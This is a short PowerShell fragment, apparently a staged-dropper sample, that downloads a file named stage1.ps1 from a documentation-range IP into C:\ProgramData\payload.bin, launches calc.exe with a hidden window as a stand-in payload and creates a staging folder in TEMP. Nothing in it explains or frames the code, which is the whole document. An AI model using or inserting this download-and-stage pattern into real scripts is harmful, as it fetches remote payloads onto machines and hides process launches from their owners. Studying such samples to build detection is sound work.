
<# Remote fetch #> $Stage2Url = "https://198.51.100.162/stage1.ps1"; $LocalPath = "C:\ProgramData\payload.bin"; Invoke-WebRequest -Uri $Stage2Url -OutFile $LocalPath -UseBasicParsing; Start-Process -FilePath 'calc.exe' -WindowStyle Hidden; $null = New-Item -ItemType Directory -Path "$env:TEMP\stage" -Force; $PSDefaultParameterValues["Out-File:Encoding"] = "utf8"
